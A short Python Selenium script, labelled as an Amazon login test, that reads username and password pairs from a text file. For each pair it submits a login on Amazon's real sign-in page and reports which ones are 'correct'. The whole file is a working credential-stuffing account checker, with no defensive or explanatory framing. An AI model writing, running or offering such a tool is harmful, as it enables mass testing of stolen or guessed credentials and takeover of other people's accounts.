from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException

# amazon login web test using selenium
options = webdriver.ChromeOptions()
prefs = {
    'profile.default_content_setting_values' : {
        'images' : 2
    }
}
options.add_experimental_option('prefs',prefs)
options.add_experimental_option("detach", True)
driver = webdriver.Chrome(executable_path="chromedriver_2_41.exe", chrome_options=options)

url = "https://www.amazon.com/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&switch_account="

def check_account(name, passed):
    driver.delete_all_cookies()
    driver.get(url)
    accountName = driver.find_element_by_css_selector("#ap_email")
    accountName.send_keys(name)
    continueBtn = driver.find_element_by_css_selector("#continue")
    continueBtn.click()

    alert = driver.find_element_by_css_selector("div.a-alert-container")
    if alert and alert.text :
        print(f"user {name} error")
        print(alert.text)
        return False

    passwd = driver.find_element_by_css_selector("#ap_password")
    passwd.send_keys(passed)
    submitBtn = driver.find_element_by_css_selector("#signInSubmit")
    submitBtn.click()
    try:
        alert = driver.find_element_by_css_selector("div.a-alert-container")
        if alert :
            print(f"password error")
            print(alert.text)
            return False
        return True
    except NoSuchElementException:
        return True

with open("account_pass.txt") as f:
    for i in f.readlines():
        try:
            [u,p] = i.split(maxsplit=1)
            r = check_account(u,p)
            if r:
                print(f"{u} correct")
            else:
                print(f"{u} wrong")
        except Exception as e:
            print(f"{u} error {e}")

driver.close()
